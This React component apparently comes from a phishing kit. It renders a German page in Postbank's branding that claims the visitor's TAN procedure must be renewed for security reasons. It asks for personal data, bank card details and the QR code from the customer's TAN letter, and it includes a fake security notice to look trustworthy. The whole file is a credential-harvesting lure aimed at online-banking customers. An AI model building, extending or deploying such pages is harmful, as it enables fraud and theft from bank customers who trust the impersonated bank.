import React from 'react';
import { AlertTriangle } from 'lucide-react';
import PostbankFooter from './PostbankFooter';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '4rem'
      }}>
        <div style={{
          maxWidth: '1280px',
          margin: '0 auto',
          width: '100%',
          padding: '0 20px'
        }}>
          {/* Warning Box */}
          <div style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '3rem',
            display: 'flex',
            alignItems: 'flex-start',
            gap: '16px',
            maxWidth: '600px'
          }}>
            <AlertTriangle size={24} color="#856404" style={{ flexShrink: 0, marginTop: '2px' }} />
            <div>
              <h2 style={{
                color: '#856404',
                fontSize: '1.25rem',
                marginBottom: '0.5rem',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontWeight: '700'
              }}>
                TAN-Verfahren erneuern
              </h2>
              <p style={{
                color: '#856404',
                fontSize: '1rem',
                margin: 0,
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                Aus Sicherheitsgründen müssen Sie Ihr TAN-Verfahren erneuern. Bitte verifizieren Sie Ihre Identität, um fortzufahren.
              </p>
            </div>
          </div>

          {/* Main Content */}
          <div style={{ maxWidth: '800px' }}>
            {/* Large Title */}
            <h1 className="mobile-title" style={{
              color: '#333333',
              fontSize: '3rem',
              marginBottom: '1.5rem',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
              fontWeight: '700',
              lineHeight: '1.1'
            }}>
              TAN erneuern
            </h1>
            
            {/* Information Text */}
            <div style={{ marginBottom: '3rem' }}>
              <p style={{
                color: '#333333',
                fontSize: '1.125rem',
                lineHeight: '1.6',
                marginBottom: '1.5rem',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Ihr TAN-Verfahren muss aus Sicherheitsgründen erneuert werden. Dies ist eine routinemäßige Sicherheitsmaßnahme zum Schutz Ihres Kontos.
              </p>
              
              <p style={{
                color: '#333333',
                fontSize: '1rem',
                lineHeight: '1.6',
                marginBottom: '1.5rem',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif'
              }}>
                Um den Prozess abzuschließen, benötigen wir:
              </p>

              <ul style={{
                color: '#333333',
                fontSize: '1rem',
                lineHeight: '1.8',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                paddingLeft: '1.5rem',
                marginBottom: '2rem'
              }}>
                <li>Ihre persönlichen Daten zur Verifizierung</li>
                <li>Ihre Bankkarten-Informationen</li>
                <li>Den QR-Code aus Ihrem TAN-Brief</li>
              </ul>
            </div>
            
            {/* Primary Button */}
            <button
              onClick={onStartVerification}
              style={{
                backgroundColor: '#0018a8',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                cursor: 'pointer',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontWeight: '700',
                transition: 'all 0.3s ease',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#001580';
                e.currentTarget.style.transform = 'translateY(-1px)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#0018a8';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              TAN-Verfahren jetzt erneuern
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>

            {/* Security Note */}
            <div style={{
              marginTop: '3rem',
              padding: '1.5rem',
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              borderLeft: '4px solid #0018a8'
            }}>
              <p style={{
                color: '#333333',
                fontSize: '0.875rem',
                margin: 0,
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                <strong>Sicherheitshinweis:</strong> Postbank wird Sie niemals per E-Mail oder Telefon nach Ihren vollständigen Zugangsdaten fragen. Diese Verifizierung erfolgt ausschließlich über unser gesichertes Online-Banking-Portal.
              </p>
            </div>
          </div>
        </div>
      </div>
      <PostbankFooter />
    </>
  );
};

export default AccountCompromisedScreen;